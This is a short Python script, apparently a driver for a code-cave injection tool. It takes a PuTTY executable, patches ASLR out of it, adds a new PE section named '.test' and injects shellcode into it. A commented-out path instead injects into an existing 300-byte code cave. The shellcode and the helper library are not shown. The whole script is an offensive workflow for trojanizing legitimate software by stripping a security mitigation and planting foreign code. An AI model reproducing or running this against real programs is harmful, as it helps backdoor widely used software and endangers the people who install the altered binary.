from codecave_added import InjectNewSection, InjectExistingSection, AslrRemover


def main():
    # file_path = r'C:\Users\paul\Desktop\code_injection\nakarov\putty-0.60-installer.exe'
    file_path = r'/home/tux/Desktop/code_injection/nakarov/putty_new.exe'
    arm = AslrRemover(file_path)
    is_verify = False
    aslr_active = arm.get_aslr_status(is_verify)
    if aslr_active:
        is_verify = True
        file_path = arm.patch_aslr()
        arm.get_aslr_status(is_verify)

    # Inject new section
    test1 = InjectNewSection(file_path, '.test')
    test1.add_new_section()
    test1.inject_shellcode()


    # Inject existing section
    # test = InjectExistingSection(file_path, cave_size = 300)
    # pe = test.load_pefile()
    # section, virtual_address, raw_address = test.find_cave(pe)
    # if section is None and virtual_address is None and raw_address is None:
    #     exit(-1)
    # else:
    #     test.inject_shellcode(pe, section, virtual_address, raw_address)


if __name__ == '__main__':
    main()